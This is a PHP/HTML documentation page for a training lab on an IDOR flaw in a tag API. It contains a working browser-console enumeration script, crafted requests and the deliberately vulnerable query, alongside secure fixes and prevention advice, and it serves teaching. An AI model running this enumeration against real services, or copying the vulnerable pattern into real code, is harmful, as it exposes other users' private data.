<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Documentation - IDOR at AddTagToAssets | Lab 23</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a0a 100%);
            min-height: 100vh;
            color: #e0e0e0;
        }
        .header {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255, 68, 68, 0.3);
            padding: 1rem 2rem;
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
        }
        .header-content {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .logo {
            font-size: 1.5rem;
            font-weight: bold;
            color: #ff4444;
            text-decoration: none;
        }
        .nav-links {
            display: flex;
            gap: 1.5rem;
            align-items: center;
        }
        .nav-links a {
            color: #e0e0e0;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.3s;
            font-size: 0.9rem;
        }
        .nav-links a:hover { color: #ff4444; }
        .btn-back {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.5rem 1rem;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 68, 68, 0.3);
            color: #e0e0e0;
            text-decoration: none;
            border-radius: 6px;
            font-weight: 500;
            font-size: 0.9rem;
            transition: all 0.3s;
        }
        .btn-back:hover {
            background: rgba(255, 68, 68, 0.2);
            border-color: #ff4444;
            color: #ff4444;
        }
        .main-wrapper {
            display: flex;
            margin-top: 60px;
        }
        .sidebar {
            width: 280px;
            background: rgba(255, 255, 255, 0.03);
            border-right: 1px solid rgba(255, 68, 68, 0.2);
            height: calc(100vh - 60px);
            position: fixed;
            overflow-y: auto;
            padding: 1.5rem 0;
        }
        .sidebar-title {
            color: #ff4444;
            font-size: 0.85rem;
            font-weight: 600;
            padding: 0 1.5rem;
            margin-bottom: 1rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .sidebar-nav a {
            display: block;
            padding: 0.8rem 1.5rem;
            color: #aaa;
            text-decoration: none;
            font-size: 0.9rem;
            border-left: 3px solid transparent;
            transition: all 0.3s;
        }
        .sidebar-nav a:hover {
            background: rgba(255, 68, 68, 0.1);
            color: #ff4444;
            border-left-color: #ff4444;
        }
        .sidebar-nav a.active {
            background: rgba(255, 68, 68, 0.15);
            color: #ff4444;
            border-left-color: #ff4444;
        }
        .quick-links {
            margin-top: 2rem;
            padding: 0 1.5rem;
        }
        .quick-links h4 {
            color: #ff4444;
            font-size: 0.8rem;
            text-transform: uppercase;
            margin-bottom: 1rem;
        }
        .quick-links a {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.6rem;
            margin-bottom: 0.5rem;
            background: rgba(255, 68, 68, 0.1);
            border: 1px solid rgba(255, 68, 68, 0.2);
            border-radius: 6px;
            color: #e0e0e0;
            text-decoration: none;
            font-size: 0.85rem;
            transition: all 0.3s;
        }
        .quick-links a:hover {
            background: rgba(255, 68, 68, 0.2);
            border-color: #ff4444;
        }
        .content {
            margin-left: 280px;
            flex: 1;
            padding: 2rem 3rem;
            max-width: calc(100% - 280px);
        }
        .content-section {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 68, 68, 0.15);
            border-radius: 12px;
            padding: 2rem;
            margin-bottom: 2rem;
        }
        .content-section h2 {
            color: #ff4444;
            font-size: 1.5rem;
            margin-bottom: 1.5rem;
            padding-bottom: 0.8rem;
            border-bottom: 1px solid rgba(255, 68, 68, 0.2);
        }
        .content-section h3 {
            color: #ff6666;
            font-size: 1.2rem;
            margin: 1.5rem 0 1rem;
        }
        .content-section p {
            color: #ccc;
            line-height: 1.8;
            margin-bottom: 1rem;
        }
        .content-section ul, .content-section ol {
            margin-left: 1.5rem;
            color: #ccc;
            line-height: 2;
            margin-bottom: 1rem;
        }
        .content-section li { margin-bottom: 0.5rem; }
        .code-block {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 68, 68, 0.2);
            border-radius: 8px;
            padding: 1.2rem;
            margin: 1rem 0;
            overflow-x: auto;
        }
        .code-block code {
            font-family: 'Consolas', 'Monaco', monospace;
            color: #ff6666;
            font-size: 0.9rem;
            line-height: 1.6;
            display: block;
            white-space: pre;
        }
        .code-block .comment { color: #666; }
        .code-block .string { color: #98c379; }
        .code-block .keyword { color: #c678dd; }
        .code-block .function { color: #61afef; }
        .info-box {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid rgba(0, 255, 0, 0.3);
            border-radius: 8px;
            padding: 1.2rem;
            margin: 1.5rem 0;
        }
        .info-box h4 {
            color: #00ff00;
            margin-bottom: 0.5rem;
        }
        .info-box p, .info-box code { color: #aaffaa; }
        .info-box code {
            background: rgba(0, 0, 0, 0.3);
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
        }
        .warning-box {
            background: rgba(255, 165, 0, 0.1);
            border: 1px solid rgba(255, 165, 0, 0.3);
            border-radius: 8px;
            padding: 1.2rem;
            margin: 1.5rem 0;
        }
        .warning-box h4 {
            color: #ffa500;
            margin-bottom: 0.5rem;
        }
        .warning-box p { color: #ffcc80; }
        .danger-box {
            background: rgba(255, 68, 68, 0.1);
            border: 1px solid rgba(255, 68, 68, 0.3);
            border-radius: 8px;
            padding: 1.2rem;
            margin: 1.5rem 0;
        }
        .danger-box h4 {
            color: #ff4444;
            margin-bottom: 0.5rem;
        }
        .danger-box p { color: #ff9999; }
        .table-container {
            overflow-x: auto;
            margin: 1rem 0;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 0.8rem;
            text-align: left;
            border-bottom: 1px solid rgba(255, 68, 68, 0.2);
        }
        th {
            color: #ff6666;
            background: rgba(255, 68, 68, 0.1);
            font-weight: 600;
        }
        td { color: #ccc; }
        td code {
            background: rgba(0, 0, 0, 0.3);
            padding: 0.2rem 0.4rem;
            border-radius: 3px;
            color: #00ff00;
            font-family: monospace;
        }
        .step-card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 68, 68, 0.2);
            border-radius: 10px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
        }
        .step-card h4 {
            color: #ff4444;
            font-size: 1.1rem;
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .step-number {
            background: linear-gradient(135deg, #ff4444, #cc0000);
            color: white;
            width: 28px;
            height: 28px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.9rem;
            font-weight: bold;
        }
        .step-card p { color: #ccc; }
        .badge {
            display: inline-block;
            padding: 0.3rem 0.8rem;
            border-radius: 15px;
            font-size: 0.75rem;
            font-weight: 600;
        }
        .badge-red {
            background: rgba(255, 68, 68, 0.2);
            color: #ff4444;
            border: 1px solid rgba(255, 68, 68, 0.3);
        }
        .badge-green {
            background: rgba(0, 255, 0, 0.2);
            color: #00ff00;
            border: 1px solid rgba(0, 255, 0, 0.3);
        }
        .badge-yellow {
            background: rgba(255, 200, 0, 0.2);
            color: #ffc800;
            border: 1px solid rgba(255, 200, 0, 0.3);
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <a href="index.php" class="logo">🏷️ TagScope</a>
            <nav class="nav-links">
                <a href="../index.php" class="btn-back">← All Labs</a>
                <a href="index.php">Home</a>
                <a href="lab-description.php">Lab Info</a>
                <a href="docs.php">Documentation</a>
                <?php if (isset($_SESSION['user_id'])): ?>
                    <a href="dashboard.php">Dashboard</a>
                    <a href="logout.php">Logout</a>
                <?php else: ?>
                    <a href="login.php">Login</a>
                <?php endif; ?>
            </nav>
        </div>
    </header>

    <div class="main-wrapper">
        <aside class="sidebar">
            <div class="sidebar-title">Documentation</div>
            <nav class="sidebar-nav">
                <a href="#overview" class="active">Overview</a>
                <a href="#vulnerability">Vulnerability Details</a>
                <a href="#technical">Technical Analysis</a>
                <a href="#exploitation">Exploitation Guide</a>
                <a href="#step-by-step">Step-by-Step</a>
                <a href="#code-analysis">Code Analysis</a>
                <a href="#impact">Real-World Impact</a>
                <a href="#prevention">Prevention</a>
                <a href="#references">References</a>
            </nav>

            <div class="quick-links">
                <h4>Quick Links</h4>
                <a href="lab-description.php">📋 Lab Description</a>
                <a href="login.php">🚀 Start Lab</a>
                <a href="setup_db.php" target="_blank">🗄️ Setup Database</a>
                <a href="success.php">🏆 Submit Solution</a>
            </div>
        </aside>

        <main class="content">
            <!-- Overview Section -->
            <section id="overview" class="content-section">
                <h2>📚 Overview</h2>
                <p>
                    This lab demonstrates an <strong>Insecure Direct Object Reference (IDOR)</strong> vulnerability 
                    discovered in a real-world bug bounty program. The vulnerability exists in the 
                    <code>AddTagToAssets</code> API operation, which allows authenticated users to enumerate 
                    and discover other organizations' private custom tags.
                </p>
                <p>
                    The vulnerability stems from the use of <strong>sequential internal IDs</strong> that are 
                    merely encoded in base64, providing no real security. An attacker can decode existing tag IDs, 
                    understand the pattern, and enumerate through other tag IDs to discover sensitive organizational data.
                </p>
                <div class="info-box">
                    <h4>💡 Key Concept</h4>
                    <p>Base64 encoding is NOT encryption. It's a reversible encoding scheme that provides 
                    zero security. Security through obscurity is not security at all.</p>
                </div>
            </section>

            <!-- Vulnerability Details Section -->
            <section id="vulnerability" class="content-section">
                <h2>🔓 Vulnerability Details</h2>
                
                <h3>Vulnerability Type</h3>
                <p><span class="badge badge-red">IDOR</span> <span class="badge badge-yellow">Enumeration</span> <span class="badge badge-red">Information Disclosure</span></p>

                <h3>Affected Endpoint</h3>
                <div class="code-block">
                    <code>POST /api/add-tag-to-asset.php</code>
                </div>

                <h3>Root Cause</h3>
                <p>The API endpoint accepts a <code>tagId</code> parameter that contains a base64-encoded 
                GraphQL-style identifier (GID). The server:</p>
                <ul>
                    <li>Decodes the base64 string to extract the internal tag ID</li>
                    <li>Retrieves the tag from the database using this ID</li>
                    <li><strong>Does NOT verify</strong> that the tag belongs to the requesting user's organization</li>
                    <li>Returns the tag information including name and owner in the response</li>
                </ul>

                <h3>ID Format Structure</h3>
                <div class="table-container">
                    <table>
                        <tr>
                            <th>Component</th>
                            <th>Example</th>
                            <th>Description</th>
                        </tr>
                        <tr>
                            <td>Internal ID</td>
                            <td><code>49790001</code></td>
                            <td>Sequential database ID (enumerable)</td>
                        </tr>
                        <tr>
                            <td>GID Format</td>
                            <td><code>gid://tagscope/AsmTag/49790001</code></td>
                            <td>GraphQL-style global identifier</td>
                        </tr>
                        <tr>
                            <td>Encoded ID</td>
                            <td><code>Z2lkOi8vdGFnc2NvcGUvQXNtVGFnLzQ5NzkwMDAx</code></td>
                            <td>Base64 encoded (sent to API)</td>
                        </tr>
                    </table>
                </div>
            </section>

            <!-- Technical Analysis Section -->
            <section id="technical" class="content-section">
                <h2>🔬 Technical Analysis</h2>
                
                <h3>Request Structure</h3>
                <div class="code-block">
                    <code>POST /api/add-tag-to-asset.php HTTP/1.1
Host: localhost
Content-Type: application/json
Cookie: PHPSESSID=your_session_id

{
    "operationName": "AddTagToAssets",
    "variables": {
        "tagId": "Z2lkOi8vdGFnc2NvcGUvQXNtVGFnLzQ5NzkwMDAx",
        "assetIds": ["AST_A_001"]
    }
}</code>
                </div>

                <h3>Vulnerable Response (Information Leak)</h3>
                <div class="code-block">
                    <code>{
    "success": true,
    "message": "Tag successfully applied to 1 asset(s)",
    "data": {
        "operationName": "AddTagToAssets",
        "tag": {
            "id": "Z2lkOi8vdGFnc2NvcGUvQXNtVGFnLzQ5NzkwMDAx",
            "internal_id": 49790001,
            "name": "Production-Critical",        <span class="comment">// LEAKED!</span>
            "owner": "victim_org",                <span class="comment">// LEAKED!</span>
            "created_at": "2024-01-15 10:30:00"
        },
        "assets_updated": ["AST_A_001"]
    }
}</code>
                </div>

                <div class="danger-box">
                    <h4>⚠️ Security Issue</h4>
                    <p>The response reveals the victim's tag name, owner organization, and creation timestamp - 
                    all sensitive information that should not be accessible to other users.</p>
                </div>
            </section>

            <!-- Exploitation Guide Section -->
            <section id="exploitation" class="content-section">
                <h2>💥 Exploitation Guide</h2>

                <h3>Attack Vector</h3>
                <ol>
                    <li>Observe your own tag IDs and decode them to understand the format</li>
                    <li>Recognize that internal IDs are sequential integers</li>
                    <li>Craft encoded IDs with different internal ID values</li>
                    <li>Send requests to the vulnerable endpoint</li>
                    <li>Extract sensitive tag information from responses</li>
                </ol>

                <h3>Encoding/Decoding in Browser Console</h3>
                <div class="code-block">
                    <code><span class="comment">// Decode an existing tag ID</span>
atob('Z2lkOi8vdGFnc2NvcGUvQXNtVGFnLzQ5NzkwMDAx')
<span class="comment">// Returns: "gid://tagscope/AsmTag/49790001"</span>

<span class="comment">// Encode a new target ID</span>
btoa('gid://tagscope/AsmTag/49790002')
<span class="comment">// Returns: "Z2lkOi8vdGFnc2NvcGUvQXNtVGFnLzQ5NzkwMDAy"</span></code>
                </div>

                <h3>Enumeration Script</h3>
                <div class="code-block">
                    <code><span class="comment">// Run this in browser console while logged in</span>
<span class="keyword">async function</span> <span class="function">enumerateTags</span>(startId, endId) {
    <span class="keyword">for</span> (<span class="keyword">let</span> id = startId; id <= endId; id++) {
        <span class="keyword">const</span> gid = <span class="string">`gid://tagscope/AsmTag/${id}`</span>;
        <span class="keyword">const</span> encoded = btoa(gid);
        
        <span class="keyword">const</span> response = <span class="keyword">await</span> fetch(<span class="string">'/AC/lab23/api/add-tag-to-asset.php'</span>, {
            method: <span class="string">'POST'</span>,
            headers: {<span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>},
            body: JSON.stringify({
                operationName: <span class="string">'AddTagToAssets'</span>,
                variables: { tagId: encoded, assetIds: [<span class="string">'AST_A_001'</span>] }
            })
        });
        
        <span class="keyword">const</span> data = <span class="keyword">await</span> response.json();
        <span class="keyword">if</span> (data.success && data.data?.tag) {
            console.log(<span class="string">`Found tag: ${data.data.tag.name} (Owner: ${data.data.tag.owner})`</span>);
        }
    }
}

<span class="comment">// Enumerate victim's tags</span>
enumerateTags(49790001, 49790007);</code>
                </div>
            </section>

            <!-- Step-by-Step Section -->
            <section id="step-by-step" class="content-section">
                <h2>📝 Step-by-Step Walkthrough</h2>

                <div class="step-card">
                    <h4><span class="step-number">1</span> Login as Attacker</h4>
                    <p>Navigate to the login page and authenticate with:</p>
                    <ul>
                        <li>Username: <code>attacker_user</code></li>
                        <li>Password: <code>attacker123</code></li>
                    </ul>
                </div>

                <div class="step-card">
                    <h4><span class="step-number">2</span> Explore Your Tags</h4>
                    <p>Go to the Tags page and observe your own tag IDs in the interface or network requests. 
                    These IDs are base64-encoded strings.</p>
                </div>

                <div class="step-card">
                    <h4><span class="step-number">3</span> Decode the Format</h4>
                    <p>Open browser console (F12) and decode one of your tag IDs:</p>
                    <div class="code-block">
                        <code>atob('YOUR_TAG_ID_HERE')</code>
                    </div>
                    <p>This reveals the GID format: <code>gid://tagscope/AsmTag/{internal_id}</code></p>
                </div>

                <div class="step-card">
                    <h4><span class="step-number">4</span> Craft Victim's Tag ID</h4>
                    <p>Encode the victim's tag ID (starting from 49790001):</p>
                    <div class="code-block">
                        <code>btoa('gid://tagscope/AsmTag/49790001')
// Result: Z2lkOi8vdGFnc2NvcGUvQXNtVGFnLzQ5NzkwMDAx</code>
                    </div>
                </div>

                <div class="step-card">
                    <h4><span class="step-number">5</span> Send Malicious Request</h4>
                    <p>Execute the API request with the crafted tag ID:</p>
                    <div class="code-block">
                        <code>fetch('/AC/lab23/api/add-tag-to-asset.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        operationName: 'AddTagToAssets',
        variables: {
            tagId: 'Z2lkOi8vdGFnc2NvcGUvQXNtVGFnLzQ5NzkwMDAx',
            assetIds: ['AST_A_001']
        }
    })
}).then(r => r.json()).then(console.log);</code>
                    </div>
                </div>

                <div class="step-card">
                    <h4><span class="step-number">6</span> Extract Information</h4>
                    <p>The response contains the victim's tag details:</p>
                    <ul>
                        <li>Tag name (reveals security classifications)</li>
                        <li>Owner organization name</li>
                        <li>Creation timestamp</li>
                    </ul>
                </div>

                <div class="step-card">
                    <h4><span class="step-number">7</span> Complete Enumeration</h4>
                    <p>Enumerate all victim tags (49790001-49790007) and submit findings on the success page.</p>
                </div>
            </section>

            <!-- Code Analysis Section -->
            <section id="code-analysis" class="content-section">
                <h2>🔍 Code Analysis</h2>

                <h3>Vulnerable Code Pattern</h3>
                <div class="code-block">
                    <code><span class="comment">// api/add-tag-to-asset.php - VULNERABLE</span>
$tagId = $data['variables']['tagId'];
$decodedGid = base64_decode($tagId);

<span class="comment">// Extract internal ID without ownership verification</span>
preg_match('/AsmTag\/(\d+)$/', $decodedGid, $matches);
$internalId = $matches[1];

<span class="comment">// Query retrieves ANY tag by ID - NO ACCESS CONTROL!</span>
$stmt = $pdo->prepare("SELECT * FROM tags WHERE internal_id = ?");
$stmt->execute([$internalId]);
$tag = $stmt->fetch();

<span class="comment">// Returns tag info regardless of ownership</span>
return json_encode(['success' => true, 'data' => ['tag' => $tag]]);</code>
                </div>

                <h3>Secure Code Pattern</h3>
                <div class="code-block">
                    <code><span class="comment">// SECURE: Verify tag ownership before returning</span>
$stmt = $pdo->prepare("
    SELECT t.* FROM tags t
    JOIN users u ON t.user_id = u.id
    WHERE t.internal_id = ? 
    AND (t.user_id = ? OR t.is_public = 1)
");
$stmt->execute([$internalId, $_SESSION['user_id']]);
$tag = $stmt->fetch();

<span class="keyword">if</span> (!$tag) {
    return json_encode([
        'success' => false,
        'error' => 'Tag not found or access denied'
    ]);
}</code>
                </div>
            </section>

            <!-- Impact Section -->
            <section id="impact" class="content-section">
                <h2>⚠️ Real-World Impact</h2>

                <p>This vulnerability pattern, while "just" information disclosure, can have severe consequences:</p>

                <h3>Exposed Information</h3>
                <ul>
                    <li><strong>Tag Names:</strong> Reveal security strategies (e.g., "PCI-DSS-Scope", "SOC2-Critical")</li>
                    <li><strong>Organization Names:</strong> Identify which companies use the platform</li>
                    <li><strong>Asset Classifications:</strong> Understand how targets categorize their systems</li>
                    <li><strong>Security Posture:</strong> Tags like "Vulnerable-Legacy" or "Needs-Patching" expose weaknesses</li>
                </ul>

                <h3>Attack Chain Potential</h3>
                <ol>
                    <li>Enumerate all custom tags across the platform</li>
                    <li>Identify high-value targets based on tag patterns</li>
                    <li>Map organizational security priorities</li>
                    <li>Use gathered intelligence for targeted attacks</li>
                </ol>

                <div class="warning-box">
                    <h4>🎯 Bounty Context</h4>
                    <p>This exact vulnerability pattern was reported through a bug bounty program and awarded 
                    a bounty for the information disclosure impact, even though no direct data modification was possible.</p>
                </div>
            </section>

            <!-- Prevention Section -->
            <section id="prevention" class="content-section">
                <h2>🛡️ Prevention</h2>

                <h3>1. Server-Side Authorization</h3>
                <p>Always verify that the requesting user has permission to access the requested resource:</p>
                <div class="code-block">
                    <code><span class="comment">// Verify ownership before ANY operation</span>
<span class="keyword">if</span> ($tag['user_id'] !== $_SESSION['user_id']) {
    http_response_code(403);
    die(json_encode(['error' => 'Access denied']));
}</code>
                </div>

                <h3>2. Use Non-Sequential Identifiers</h3>
                <p>Replace sequential IDs with UUIDs or random tokens:</p>
                <div class="code-block">
                    <code><span class="comment">// Use UUIDs instead of integers</span>
$tagUuid = bin2hex(random_bytes(16));
INSERT INTO tags (uuid, name, ...) VALUES (?, ?, ...)</code>
                </div>

                <h3>3. Minimize Information in Responses</h3>
                <p>Don't return more data than necessary:</p>
                <div class="code-block">
                    <code><span class="comment">// Only return necessary fields</span>
$response = [
    'success' => true,
    'message' => 'Operation completed'
];
<span class="comment">// Don't include: tag name, owner, internal details</span></code>
                </div>

                <h3>4. Rate Limiting</h3>
                <p>Implement rate limiting to prevent mass enumeration attempts.</p>

                <h3>5. Monitoring & Alerting</h3>
                <p>Log and alert on suspicious patterns like sequential ID access attempts.</p>
            </section>

            <!-- References Section -->
            <section id="references" class="content-section">
                <h2>📖 References</h2>
                <ul>
                    <li><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" target="_blank" style="color: #ff6666;">OWASP Top 10 - Broken Access Control</a></li>
                    <li><a href="https://portswigger.net/web-security/access-control/idor" target="_blank" style="color: #ff6666;">PortSwigger - IDOR Vulnerabilities</a></li>
                    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html" target="_blank" style="color: #ff6666;">OWASP IDOR Prevention Cheat Sheet</a></li>
                    <li><a href="https://hackerone.com/reports/1695954" target="_blank" style="color: #ff6666;">HackerOne - Original Bug Report Pattern</a></li>
                </ul>
            </section>
        </main>
    </div>

    <script>
        // Smooth scrolling and active link highlighting
        document.querySelectorAll('.sidebar-nav a').forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                const targetId = this.getAttribute('href').substring(1);
                const target = document.getElementById(targetId);
                if (target) {
                    target.scrollIntoView({ behavior: 'smooth', block: 'start' });
                }
                document.querySelectorAll('.sidebar-nav a').forEach(l => l.classList.remove('active'));
                this.classList.add('active');
            });
        });

        // Highlight active section on scroll
        window.addEventListener('scroll', () => {
            const sections = document.querySelectorAll('.content-section');
            let current = '';
            sections.forEach(section => {
                const sectionTop = section.offsetTop;
                if (scrollY >= sectionTop - 100) {
                    current = section.getAttribute('id');
                }
            });
            document.querySelectorAll('.sidebar-nav a').forEach(link => {
                link.classList.remove('active');
                if (link.getAttribute('href') === '#' + current) {
                    link.classList.add('active');
                }
            });
        });
    </script>
</body>
</html>